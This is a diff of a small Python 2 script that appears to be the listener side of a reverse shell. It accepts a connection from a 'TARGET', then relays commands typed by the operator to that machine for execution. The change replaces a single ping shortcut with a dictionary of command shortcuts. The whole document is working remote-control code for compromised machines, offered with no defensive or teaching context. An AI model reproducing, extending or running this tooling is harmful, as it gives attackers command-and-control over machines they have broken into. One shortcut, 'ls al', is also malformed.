@@ -14,12 +14,15 @@ S.listen(10)
 (client, (ip, port)) = S.accept()
 
 print "TARGET CONNECTED BY ", ip
+shortcuts = {
+    'p': 'ping -c 3 google.com',
+    'l': 'ls al',
+}
 
 while True:
     data = client.recv(1024)
 
     cmd = raw_input(data)
-    ping = "ping -c 3 google.com"
 
     if cmd == 'quit' or cmd == 'q':
         break
@@ -27,11 +30,10 @@ while True:
     if cmd == 'exit':
         break
 
-    if cmd == 'p':
-       cmd = ping
-
-    if cmd:
-        client.sendall('{}\n'.format(cmd).encode('utf-8'))
+    new_cmd = shortcuts.get(cmd, cmd)
+    #print(new_cmd)
+    if new_cmd:
+        client.sendall('{}\n'.format(new_cmd).encode('utf-8'))
     else:
         continue
 client.close()
